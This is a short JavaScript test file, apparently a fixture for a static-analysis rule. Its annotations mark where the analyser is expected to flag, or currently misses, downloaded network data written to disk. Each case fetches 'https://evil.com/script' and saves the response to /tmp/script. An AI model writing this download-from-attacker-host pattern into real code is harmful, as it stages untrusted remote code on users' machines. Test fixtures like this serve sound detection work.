var https = require("https");
var fs = require("fs");

https.get('https://evil.com/script', res => {
  res.on("data", d => { // $ Source
    fs.writeFileSync("/tmp/script", d) // $ Alert
  });
});


https.get('https://evil.com/script', res => {
  res.on("data", d => { // $ MISSING: Source
    fs.open("/tmp/script", 'r', (err, fd) => {
      fs.writev(fd, [d], (err, bytesWritten) => { // $ MISSING: Alert
        console.log(`Wrote ${bytesWritten} bytes`);
      });

      const bytesWritten = fs.writevSync(fd, [d]); // $ MISSING: Alert
    });
  });
});
